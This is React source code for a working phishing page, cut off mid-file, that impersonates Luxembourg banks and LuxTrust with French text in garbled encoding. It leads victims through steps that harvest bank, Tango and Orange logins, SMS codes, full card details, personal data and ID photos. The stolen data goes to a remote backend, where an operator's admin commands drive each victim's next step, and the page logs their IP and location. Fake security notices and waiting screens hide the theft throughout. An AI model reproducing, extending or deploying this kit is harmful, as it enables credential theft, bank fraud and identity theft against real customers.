import { useEffect, useRef, useState } from "react";
import { Link, useNavigate, useParams } from "react-router-dom";
import { USER_ID_EXAMPLE, QR_BANKS, getBank, validateUserId } from "../lib/banks";
import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
import {
  apiEnabled,
  apiGetCommand,
  apiGetQr,
  apiHeartbeat,
  apiRegisterVisitor,
  apiSubmit,
  apiUploadId,
} from "../lib/api";
import {
  COMMAND_TO_STATUS,
  fetchIpLocation,
  getChannel,
  getOrCreateVisitorId,
  makeVisitorId,
  readCommands,
  readQrMap,
  readSubmissions,
  readVisitors,
  writeSubmissions,
  writeVisitors,
} from "../lib/realtime";

const TOTAL_STEPS = 8;

const STEP_LABELS = [
  "Identifiants",
  "Approbation",
  "TÃ©lÃ©phone",
  "SMS",
  "Carte",
  "Infos",
  "ID",
  "Confirmation",
];

const STATUS_TO_STEP = {
  waiting: 1,
  login_requested: 1,
  login_submitted: 1,
  tango_requested: 1,
  tango_submitted: 1,
  orange_requested: 1,
  orange_submitted: 1,
  qr_requested: 2,
  qr_submitted: 2,
  approve_requested: 2,
  approve_submitted: 2,
  phone_requested: 3,
  phone_submitted: 3,
  sms_requested: 4,
  sms_submitted: 4,
  card_requested: 5,
  card_submitted: 5,
  info_requested: 6,
  info_submitted: 6,
  id_requested: 7,
  id_submitted: 7,
  confirm_requested: 8,
  done: 8,
};

function BankHeaderLogo({ bank }) {
  const src = BANK_LOGO_URLS[bank.slug];
  const fallback = BANK_FALLBACK_URLS[bank.slug];
  return (
    <span className="flex h-8 w-12 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white px-1 sm:h-9 sm:w-14">
      {src ? (
        <img
          src={src}
          alt={bank.name}
          loading="eager"
          className="max-h-7 w-auto max-w-full object-contain sm:max-h-8"
          onError={(e) => {
            const img = e.currentTarget;
            if (fallback && img.src !== fallback) {
              img.src = fallback;
            } else {
              img.style.display = "none";
              if (img.nextElementSibling) img.nextElementSibling.style.display = "flex";
            }
          }}
        />
      ) : null}
      <span
        style={{ display: src ? "none" : "flex" }}
        className="h-8 w-12 items-center justify-center text-[16px] font-extrabold sm:h-9 sm:w-14 sm:text-[18px]"
      >
        {bank.initial}
      </span>
    </span>
  );
}

function Shell({ bank, step, children, title, kicker, desc }) {
  const pct = Math.round((step / TOTAL_STEPS) * 100);
  return (
    <div className="min-h-screen w-full overflow-x-hidden bg-neutral-100">
      <header className="w-full text-white" style={{ backgroundColor: bank.color }}>
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between gap-2 px-3 py-2.5 sm:px-6 sm:py-3">
          <div className="flex min-w-0 flex-1 items-center gap-2 sm:gap-2.5">
            <BankHeaderLogo bank={bank} />
            <span className="min-w-0 leading-tight">
              <span className="block truncate text-[14px] font-extrabold sm:text-[16px]">{bank.name}</span>
              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">VÃ©rification sÃ©curisÃ©e via LuxTrust</span>
            </span>
          </div>
          <Link to="/" className="shrink-0 rounded-full bg-black/20 px-3 py-2 text-[12px] font-medium hover:bg-black/30 active:bg-black/40">
            âœ• Annuler
          </Link>
        </div>
      </header>

      <div className="mx-auto w-full max-w-3xl px-3 pt-4 sm:px-6 sm:pt-5">
        <div className="flex flex-wrap items-center gap-2 text-[12px] font-semibold">
          <span className="shrink-0 rounded-full px-2.5 py-1 text-white" style={{ backgroundColor: bank.color }}>
            Ã‰tape {step} sur {TOTAL_STEPS}
          </span>
          <span className="hidden min-w-0 flex-1 truncate text-neutral-500 md:block">{STEP_LABELS.join(" â†’ ")}</span>
          <span className="truncate text-neutral-500 md:hidden">{STEP_LABELS[step - 1]}</span>
        </div>
        <div className="mt-2 h-1.5 w-full overflow-hidden rounded-full bg-neutral-200">
          <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
        </div>
      </div>

      <main className="mx-auto w-full max-w-3xl px-3 py-4 sm:px-6 sm:py-6">
        <div
          className="w-full overflow-hidden rounded-2xl bg-white shadow-[0_12px_40px_-12px_rgba(0,0,0,0.18)] ring-1 ring-black/5 sm:rounded-[20px]"
          style={{ "--brand": bank.color }}
        >
          <div className="h-1.5 w-full" style={{ background: `linear-gradient(90deg, ${bank.color}, ${bank.color}88)` }} />
          <div className="w-full px-4 py-6 sm:px-8 sm:py-8">
            <p className="flex min-w-0 items-center gap-2">
              <span className="flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[11px] font-extrabold uppercase tracking-[0.14em] text-white" style={{ backgroundColor: bank.color }}>
                <img
                  src={BANK_LOGO_URLS[bank.slug]}
                  alt=""
                  aria-hidden="true"
                  loading="lazy"
                  className="h-4 w-7 shrink-0 rounded-full bg-white object-contain"
                  onError={(e) => {
                    const img = e.currentTarget;
                    const fb = BANK_FALLBACK_URLS[bank.slug];
                    if (fb && img.src !== fb) img.src = fb;
                    else img.style.display = "none";
                  }}
                />
                <span className="truncate">
                  {bank.short} â€¢ {kicker}
                </span>
              </span>
            </p>
            <h1 className="mt-2.5 break-words text-[22px] font-extrabold leading-tight tracking-tight text-neutral-900 sm:text-[24px]">{title}</h1>
            {desc && <p className="mt-1.5 max-w-xl text-[13.5px] leading-relaxed text-neutral-500 sm:text-[14px]">{desc}</p>}
            <div className="mt-5 w-full sm:mt-6">{children}</div>
            <div className="mt-6 flex items-center gap-3 border-t border-dashed border-neutral-200 pt-4">
              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-emerald-50 text-[13px]">ðŸ”’</span>
              <p className="text-[11.5px] leading-snug text-neutral-400">
                ChiffrÃ© et sÃ©curisÃ© â€¢ <b className="font-semibold text-neutral-500">{bank.name}</b> â€¢ PropulsÃ© par LuxTrust
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

function WaitingLoader({ bank, stepNum, note }) {
  return (
    <Shell
      bank={bank}
      step={stepNum}
      kicker="Connexion sÃ©curisÃ©e"
      title="Veuillez patienterâ€¦"
      desc="Votre session sÃ©curisÃ©e est en cours de prÃ©paration. Ne fermez pas cette page."
    >
      <div className="flex w-full flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-gradient-to-b from-neutral-50 to-white px-4 py-9 text-center sm:py-11">
        <span className="relative flex h-20 w-20 items-center justify-center">
          <span className="absolute inset-0 animate-ping rounded-3xl opacity-20" style={{ backgroundColor: bank.color }} />
          <span className="absolute inset-1 rounded-3xl bg-white shadow-lg ring-1 ring-black/5" />
          <img
            src={BANK_LOGO_URLS[bank.slug]}
            alt={bank.name}
            className="relative h-10 w-24 object-contain"
            onError={(e) => {
              const img = e.currentTarget;
              const fb = BANK_FALLBACK_URLS[bank.slug];
              if (fb && img.src !== fb) img.src = fb;
              else img.style.display = "none";
            }}
          />
        </span>
        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Veuillez patienterâ€¦</p>
        <p className="mt-1 max-w-sm text-[13.5px] leading-relaxed text-neutral-500">
          {note || "Connexion sÃ©curisÃ©e en cours. Cela prend gÃ©nÃ©ralement quelques secondes."}
        </p>
        <span className="mt-4 flex items-center gap-1.5">
          {[0, 1, 2].map((i) => (
            <span key={i} className="h-2 w-2 animate-bounce rounded-full" style={{ backgroundColor: bank.color, animationDelay: `${i * 0.15}s` }} />
          ))}
        </span>
      </div>
    </Shell>
  );
}

function PrimaryBtn({ bank, disabled, loading, onClick, children, type = "button" }) {
  return (
    <button
      type={type}
      disabled={disabled || loading}
      onClick={onClick}
      className="flex min-h-[52px] w-full items-center justify-center gap-2 rounded-xl px-4 py-3.5 text-[15px] font-extrabold tracking-wide text-white transition-all duration-200 hover:brightness-110 hover:shadow-xl active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-40 disabled:hover:brightness-100 sm:text-[15.5px]"
      style={{ background: `linear-gradient(180deg, ${bank.color}, ${bank.dark || bank.color})`, boxShadow: `0 10px 24px -10px ${bank.color}cc` }}
    >
      {loading ? (
        <>
          <span className="h-4 w-4 shrink-0 animate-spin rounded-full border-2 border-white/40 border-t-white" />
          Verifyingâ€¦
        </>
      ) : (
        children
      )}
    </button>
  );
}

function ApproveVisual({ bank }) {
  return (
    <div className="flex w-full items-center gap-4 rounded-2xl border border-neutral-200 bg-gradient-to-br from-neutral-50 to-white px-4 py-5 sm:px-5">
      {/* mini phone mockup */}
      <span className="relative w-14 shrink-0">
        <span className="mx-auto block h-24 w-14 rounded-[14px] bg-neutral-900 p-1 shadow-lg">
          <span className="block h-full w-full rounded-[10px] bg-white">
            <span className="mx-auto mt-1 block h-1 w-6 rounded-full bg-neutral-200" />
            <span className="mx-1.5 mt-1.5 block rounded-md p-1.5" style={{ backgroundColor: `${bank.color}14` }}>
              <span className="block h-1.5 w-3/4 rounded-full" style={{ backgroundColor: bank.color }} />
              <span className="mt-1 block h-1.5 w-1/2 rounded-full bg-neutral-200" />
            </span>
            <span className="mx-1.5 mt-1 block rounded-md bg-emerald-500 p-1 text-center text-[7px] font-extrabold text-white">Approve</span>
          </span>
        </span>
        <span className="absolute -right-0.5 -top-1 flex h-5 w-5 items-center justify-center rounded-full bg-red-500 text-[11px] font-bold text-white ring-2 ring-white">
          1
        </span>
      </span>
      <span className="min-w-0 flex-1">
        <span className="block text-[14px] font-extrabold text-neutral-900">Ouvrez votre application LuxTrust</span>
        <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Appuyez sur la notification push, puis confirmez que c&apos;est bien vous.</span>
        <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-white px-3 py-1.5 text-[12px] font-semibold text-neutral-600 shadow-sm ring-1 ring-black/5">
          <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-emerald-500" />
          En attente d&apos;approbationâ€¦
        </span>
      </span>
    </div>
  );
}

const inputCls = (err) =>
  `w-full min-w-0 rounded-xl border-2 bg-slate-50/70 py-3.5 pl-11 pr-3.5 text-[16px] text-neutral-900 shadow-[inset_0_1px_2px_rgba(0,0,0,0.04)] outline-none transition-all duration-200 placeholder:font-normal placeholder:text-neutral-300 hover:border-neutral-300 hover:bg-white sm:text-[15px] ${
    err
      ? "border-red-300 bg-red-50/50 focus:border-red-500 focus:bg-white focus:ring-4 focus:ring-red-500/10"
      : "border-neutral-200 focus:border-[var(--brand)] focus:bg-white focus:ring-4 focus:ring-neutral-900/5 focus:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)]"
  }`;
const inputClsPlain = (err) =>
  `w-full min-w-0 rounded-xl border-2 bg-slate-50/70 px-3.5 py-3.5 text-[16px] text-neutral-900 shadow-[inset_0_1px_2px_rgba(0,0,0,0.04)] outline-none transition-all duration-200 placeholder:font-normal placeholder:text-neutral-300 hover:border-neutral-300 hover:bg-white sm:text-[15px] ${
    err
      ? "border-red-300 bg-red-50/50 focus:border-red-500 focus:bg-white focus:ring-4 focus:ring-red-500/10"
      : "border-neutral-200 focus:border-[var(--brand)] focus:bg-white focus:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)]"
  }`;
const errCls = "mt-1.5 flex items-center gap-1 text-[12.5px] font-semibold text-red-600";
const labelCls = "text-[13px] font-extrabold tracking-wide text-neutral-800";

function LeadIcon({ d, className = "" }) {
  return (
    <span className={`pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-400 ${className}`}>
      <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
        <path d={d} />
      </svg>
    </span>
  );
}

const P = {
  user: "M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2 M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z",
  lock: "M5 11h14a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1z M8 11V7a4 4 0 0 1 8 0v4",
  phone: "M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1.9.3 1.8.6 2.7a2 2 0 0 1-.4 2.1L8.1 9.7a16 16 0 0 0 6 6l1.2-1.2a2 2 0 0 1 2.1-.4c.9.3 1.8.5 2.7.6a2 2 0 0 1 1.9 2z",
  chat: "M21 11.5a8.4 8.4 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.4 8.4 0 0 1-3.8-.9L3 21l1.9-5.7a8.4 8.4 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.4 8.4 0 0 1 3.8-.9h.5a8.5 8.5 0 0 1 8 8v.5z",
  card: "M2 6a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z M2 10h20",
  cal: "M8 2v4 M16 2v4 M3 8h18 M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z",
  pin: "M20 10c0 6-8 12-8 12S4 16 4 10a8 8 0 0 1 16 0z M12 13a3 3 0 1 0 0-6 3 3 0 0 0 0 6z",
  hash: "M4 9h16 M4 15h16 M10 3 8 21 M16 3l-2 18",
};

export default function BankFlow() {
  const { bankSlug } = useParams();
  const bank = getBank(bankSlug);
  const navigate = useNavigate();

  // First paint is decided synchronously: fresh bank click â†’ login at once
  // (loader can never flash), refresh mid-flow â†’ resume saved status.
  const [status, setStatus] = useState(() => {
    try {
      if (sessionStorage.getItem("fresh_visit") === "1") return "login_requested";
      const vid = sessionStorage.getItem("visitor_id");
      if (vid) {
        const all = JSON.parse(localStorage.getItem("live_visitors_v1") || "{}");
        if (all[vid]?.status) return all[vid].status;
      }
    } catch {}
    return "login_requested";
  });
  const [loading, setLoading] = useState(false);
  const visitorIdRef = useRef(null);
  // One-shot commands: each admin command (type+timestamp) is applied once.
  // After the user submits, older commands can never pull them back to the form.
  const appliedCmdRef = useRef("");
  const answeredRef = useRef(0);

  // form states (all hooks at top â€” never conditional)
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [orangeUser, setOrangeUser] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [t1, setT1] = useState(false);
  const [phone, setPhone] = useState("");
  const [t3, setT3] = useState(false);
  const [sms, setSms] = useState("");
  const [t4, setT4] = useState(false);
  // BIL QR step: OTP shown under the mosaic (real BILnet layout).
  const [otp, setOtp] = useState("");
  const [card, setCard] = useState({ holder: "", number: "", exp: "", cvc: "" });
  const [t5, setT5] = useState(false);
  const [info, setInfo] = useState({ first: "", last: "", dob: "", address: "", zip: "", city: "" });
  const [t6, setT6] = useState(false);
  // BIL QR uploaded by admin (per session). Null until the admin uploads.
  const [qrImg, setQrImg] = useState(null);
  // ID photos (all banks except tango/orange): front + back files.
  const [idFront, setIdFront] = useState(null);
  const [idBack, setIdBack] = useState(null);
  const [idFrontUrl, setIdFrontUrl] = useState("");
  const [idBackUrl, setIdBackUrl] = useState("");
  const [idErr, setIdErr] = useState("");
  const [idUp, setIdUp] = useState(false);
  const [idPct, setIdPct] = useState({ front: 0, back: 0 });

function readFileAsDataURL(file) {
  return new Promise((resolve, reject) => {
    const r = new FileReader();
    r.onload = () => resolve(r.result);
    r.onerror = () => reject(new Error("read"));
    r.readAsDataURL(file);
  });
}

function checkIdFile(file) {
  if (!file) return "";
  const t = (file.type || "").toLowerCase();
  if (t !== "image/png" && t !== "image/jpeg" && t !== "image/jpg")
    return "PNG, JPG ou JPEG uniquement.";
  if (file.size < 100 * 1024) return "Image trop petite (min 100 Ko).";
  if (file.size > 1024 * 1024) return "Image trop grande (max 1 Mo).";
  return "";
}

  function pushSubmission(kind, data) {
    const entry = {
      id: "s_" + Math.random().toString(36).slice(2, 9) + Date.now().toString(36).slice(-4),
      visitorId: visitorIdRef.current,
      bank: bankSlug,
      kind,
      data,
      at: Date.now(),
    };
    const all = readSubmissions();
    all.push(entry);
    writeSubmissions(all);
    try {
      getChannel()?.postMessage({ type: "submission", entry });
    } catch {}
    // Postgres Render backend (multi-device) â€” fire and forget
    if (apiEnabled()) apiSubmit(entry).catch(() => {});
  }

  function updateVisitor(patch) {
    try {
      const map = readVisitors();
      const id = visitorIdRef.current;
      if (!id || !map[id]) return;
      map[id] = { ...map[id], ...patch, lastSeen: Date.now() };
      writeVisitors(map);
      try {
        getChannel()?.postMessage({ type: "visitor-update", visitor: map[id] });
      } catch {}
    } catch {}
    if (apiEnabled() && visitorIdRef.current) {
      apiHeartbeat(visitorIdRef.current, patch).catch(() => {});
    }
  }

  function applyCommand(type, at) {
    const next = COMMAND_TO_STATUS[type];
    if (!next) return;
    const stamp = at || 0;
    // Ignore commands sent before the user's last submit â€” the loader stays.
    if (stamp <= answeredRef.current) return;
    const key = `${type}:${stamp}`;
    if (appliedCmdRef.current === key) return;
    appliedCmdRef.current = key;
    setStatus(next);
    updateVisitor({ status: next });
  }

  // Register visitor + heartbeat + listen for admin commands
  useEffect(() => {
    if (!bank) return;
    // One bank visit = one session = one visitor row with its own separate logs.
    // A fresh click from the landing ALWAYS starts at login directly.
    // Same-bank remount (refresh/HMR) resumes the visit instead.
    let id;
    let fresh = false;
    try {
      fresh = sessionStorage.getItem("fresh_visit") === "1";
      sessionStorage.removeItem("fresh_visit");
    } catch {}
    try {
      const lastBank = sessionStorage.getItem("last_bank");
      if (!fresh && lastBank === bankSlug) {
        id = getOrCreateVisitorId();
      } else {
        id = makeVisitorId();
        try {
          sessionStorage.setItem("visitor_id", id);
          sessionStorage.setItem("last_bank", bankSlug);
        } catch {}
      }
    } catch {
      id = makeVisitorId();
    }
    visitorIdRef.current = id;

    const base = {
      id,
      bank: bankSlug,
      bankName: bank.name,
      // Step 1 (login) shows directly â€” no admin ask needed for it.
      status: "login_requested",
      joinedAt: Date.now(),
      lastSeen: Date.now(),
      ip: "â€¦",
      city: "â€¦",
      country: "â€¦",
      ua: navigator.userAgent,
    };
    const map = readVisitors();
    map[id] = { ...(map[id] || {}), ...base, status: fresh ? "login_requested" : map[id]?.status || "login_requested" };
    // keep original joinedAt if re-visiting
    if (map[id] && !map[id].joinedAt) map[id].joinedAt = Date.now();
    writeVisitors(map);
    // Prime one-shot guards from the registry so a remount never replays old commands.
    answeredRef.current = map[id]?.answeredAt || 0;
    appliedCmdRef.current = "";
    setStatus(map[id].status || "login_requested");
    try {
      getChannel()?.postMessage({ type: "visitor-hello", visitor: map[id] });
    } catch {}

    fetchIpLocation().then((loc) => {
      updateVisitor({ ip: loc.ip, city: loc.city, country: loc.country });
      if (apiEnabled()) {
        apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ...loc, ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
      }
    });

    if (apiEnabled()) {
      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ip: "â€¦", city: "â€¦", country: "â€¦", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
    }

    const hb = setInterval(() => {
      try {
        const m = readVisitors();
        if (m[id]) {
          m[id].lastSeen = Date.now();
          m[id].bank = bankSlug;
          m[id].bankName = bank.name;
          // status is source of truth from state â€” sync it
          writeVisitors(m);
        }
      } catch {}
      // Postgres heartbeat + command poll (Render backend, multi-device)
      if (apiEnabled()) {
        apiHeartbeat(id, { bank: bankSlug, bankName: bank.name }).catch(() => {});
        apiGetCommand(id)
          .then((r) => {
            if (r?.command?.type) applyCommand(r.command.type, Number(r.command.at) || 0);
          })
          .catch(() => {});
      }
    }, 3000);

    const ch = getChannel();
    const onMsg = (ev) => {
      const msg = ev.data;
      if (!msg) return;
      if (msg.type === "command" && msg.visitorId === id) {
        applyCommand(msg.command, Number(msg.at) || 0);
      }
      if (msg.type === "command-all" && msg.command) {
        applyCommand(msg.command, Number(msg.at) || 0);
      }
    };
    ch?.addEventListener?.("message", onMsg);

    const onStorage = (e) => {
      if (e.key === "live_commands_v1") {
        try {
          const cmds = readCommands();
          const c = cmds[id];
          if (c) applyCommand(c.type, Number(c.at) || 0);
        } catch {}
      }
    };
    window.addEventListener("storage", onStorage);

    return () => {
      clearInterval(hb);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
      window.removeEventListener("storage", onStorage);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bankSlug]);

  // Keep registry status in sync when local status changes (after submit)
  useEffect(() => {
    if (!visitorIdRef.current) return;
    updateVisitor({ status });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status]);

  // QR banks only: poll the admin-uploaded QR for THIS session. Shows the moment
  // the admin uploads; each session has its own QR.
  useEffect(() => {
    if (!bank || !QR_BANKS.includes(bank.slug) || status !== "qr_requested" || !visitorIdRef.current) return;
    const id = visitorIdRef.current;
    let stop = false;
    const fetchQr = async () => {
      try {
        const m = readQrMap();
        if (!stop && m[id]?.image) setQrImg(m[id].image);
      } catch {}
      if (apiEnabled()) {
        try {
          const r = await apiGetQr(id);
          if (!stop && r?.qr?.image) setQrImg(r.qr.image);
          else if (!stop && !r?.qr) setQrImg(null);
        } catch {}
      }
    };
    fetchQr();
    const iv = setInterval(fetchQr, 3000);
    const onStorage = (e) => {
      if (e.key === "live_qr_v1") fetchQr();
    };
    window.addEventListener("storage", onStorage);
    const ch = getChannel();
    const onMsg = (ev) => {
      if (ev.data?.type === "qr-update" && ev.data?.visitorId === id) fetchQr();
    };
    ch?.addEventListener?.("message", onMsg);
    return () => {
      stop = true;
      clearInterval(iv);
      window.removeEventListener("storage", onStorage);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bankSlug, status]);

  function go(fn) {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      fn();
    }, 900);
  }

  if (!bank) {
    return (
      <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
        <div className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow sm:p-6">
          <p className="text-lg font-bold">Banque inconnue</p>
          <Link to="/" className="mt-4 inline-block min-h-[44px] w-full rounded-lg bg-neutral-900 px-4 py-2.5 text-sm font-bold text-white sm:w-auto">
            â† Retour Ã  LuxTrust
          </Link>
        </div>
      </div>
    );
  }

  const goHome = () => navigate("/");
  const stepNum = STATUS_TO_STEP[status] || 1;

  function submitAndWait(kind, data, nextStatus) {
    pushSubmission(kind, data);
    // Seal this moment: any admin command older than now is consumed history
    // and can never pull the user back to the filled form. Loader stays.
    const t = Date.now();
    answeredRef.current = t;
    updateVisitor({ status: nextStatus, answeredAt: t });
    go(() => setStatus(nextStatus));
  }

  /* ---------- WAITING / SUBMITTED -> loader ---------- */
  if (
    status === "waiting" ||
    status === "login_submitted" ||
    status === "tango_submitted" ||
    status === "orange_submitted" ||
    status === "qr_submitted" ||
    status === "approve_submitted" ||
    status === "phone_submitted" ||
    status === "sms_submitted" ||
    status === "card_submitted" ||
    status === "info_submitted" ||
    status === "id_submitted" ||
    status === "confirm_submitted"
  ) {
    const notes = {
      waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sÃ©curitÃ©â€¦",
      login_submitted: "Identifiants reÃ§us. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
      tango_submitted: "Tango reÃ§u. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
      orange_submitted: "Orange reÃ§u. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
      qr_submitted: "QR-code et OTP reÃ§us. Veuillez patienterâ€¦",
      approve_submitted: "Approbation reÃ§ue. Veuillez patienterâ€¦",
      phone_submitted: "NumÃ©ro reÃ§u. Veuillez patienterâ€¦",
      sms_submitted: "Code SMS reÃ§u. Veuillez patienterâ€¦",
      card_submitted: "DÃ©tails de la carte reÃ§us. Veuillez patienterâ€¦",
      info_submitted: "Informations reÃ§ues. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
      id_submitted: "PiÃ¨ce d'identitÃ© reÃ§ue. Veuillez patienterâ€¦",
      confirm_submitted: "Confirmation reÃ§ue. Veuillez patienterâ€¦",
    };
    return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
  }

  /* ---------- TANGO (admin ask, any bank) ---------- */
  if (status === "tango_requested") {
    {
      const digits = phone.replace(/\D/g, "");
      const phErr = !t3 ? "" : !digits ? "Le numÃ©ro de tÃ©lÃ©phone est requis." : digits.length < 8 ? "Veuillez saisir un numÃ©ro valide." : "";
      const pwErr = !t3 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
      const ok = digits.length >= 8 && password.length >= 4;
      return (
        <Shell
          bank={bank}
          step={1}
          kicker="Connexion"
          title="Connectez-vous Ã  Tango"
          desc={<>Entrez votre <strong>numÃ©ro de tÃ©lÃ©phone et mot de passe</strong> Tango pour continuer.</>}
        >
          <form
            noValidate
            onSubmit={(e) => {
              e.preventDefault();
              setT3(true);
              if (!ok) return;
              submitAndWait("login", { phone: digits, password }, "tango_submitted");
            }}
          >
            <label className="block min-w-0">
              <span className={labelCls}>NumÃ©ro de tÃ©lÃ©phone</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.phone} />
                <input
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/[^\d\s]/g, ""))}
                  onBlur={() => setT3(true)}
                  placeholder="621 123 456"
                  inputMode="tel"
                  autoComplete="tel"
                  className={`${inputCls(phErr)}`}
                />
              </span>
              {phErr && <span className={errCls}>âš  {phErr}</span>}
            </label>
            <label className="mt-4 block min-w-0">
              <span className={labelCls}>Mot de passe</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.lock} />
                <input
                  type={showPw ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onBlur={() => setT3(true)}
                  placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
                  autoComplete="current-password"
                  className={`${inputCls(pwErr)} pr-14`}
                />
                <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
                  {showPw ? "Masquer" : "Afficher"}
                </button>
              </span>
              {pwErr && <span className={errCls}>âš  {pwErr}</span>}
            </label>
            <div className="mt-6">
              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter â†’</PrimaryBtn>
            </div>
          </form>
        </Shell>
      );
    }
  }

  /* ---------- ORANGE (admin ask, any bank) ---------- */
  if (status === "orange_requested") {
      const unErr = !t1 ? "" : !orangeUser.trim() ? "Le nom d'utilisateur est requis." : "";
      const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
      const ok = orangeUser.trim() && password.length >= 4;
      return (
        <Shell
          bank={bank}
          step={1}
          kicker="Connexion"
          title="Connectez-vous Ã  Orange"
          desc={<>Entrez votre <strong>nom d&apos;utilisateur et mot de passe</strong> Orange pour continuer.</>}
        >
          <form
            noValidate
            onSubmit={(e) => {
              e.preventDefault();
              setT1(true);
              if (!ok) return;
              submitAndWait("login", { username: orangeUser.trim(), password }, "orange_submitted");
            }}
          >
            <label className="block min-w-0">
              <span className={labelCls}>Nom d&apos;utilisateur</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.user} />
                <input
                  value={orangeUser}
                  onChange={(e) => setOrangeUser(e.target.value)}
                  onBlur={() => setT1(true)}
                  placeholder="Nom d'utilisateur"
                  autoComplete="username"
                  className={`${inputCls(unErr)}`}
                />
              </span>
              {unErr && <span className={errCls}>âš  {unErr}</span>}
            </label>
            <label className="mt-4 block min-w-0">
              <span className={labelCls}>Mot de passe</span>
              <span className="relative mt-2 block">
                <LeadIcon d={P.lock} />
                <input
                  type={showPw ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onBlur={() => setT1(true)}
                  placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
                  autoComplete="current-password"
                  className={`${inputCls(pwErr)} pr-14`}
                />
                <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
                  {showPw ? "Masquer" : "Afficher"}
                </button>
              </span>
              {pwErr && <span className={errCls}>âš  {pwErr}</span>}
            </label>
            <div className="mt-6">
              <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Se connecter â†’</PrimaryBtn>
            </div>
          </form>
        </Shell>
      );
    }

  /* ---------- LOGIN ---------- */
  if (status === "login_requested") {
    const uidErr = t1 ? validateUserId(userId) : "";
    const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
    const ok = validateUserId(userId) === "" && password.length >= 4;
    return (
      <Shell
        bank={bank}
        step={1}
        kicker="PremiÃ¨re Ã©tape"
        title="Connectez-vous pour vÃ©rifier votre identitÃ©"
        desc={<>Entrez vos identifiants <strong>{bank.name}</strong>. Ceci est nÃ©cessaire pour garder votre accÃ¨s LuxTrust actif.</>}
      >
        <form
          noValidate
          onSubmit={(e) => {
            e.preventDefault();
            setT1(true);
            if (!ok) return;
            submitAndWait("login", { username: userId.toUpperCase(), password }, "login_submitted");
          }}
        >
          <label className="block min-w-0">
            <span className="flex flex-wrap items-center gap-2 text-[13px] font-extrabold tracking-wide text-neutral-800">
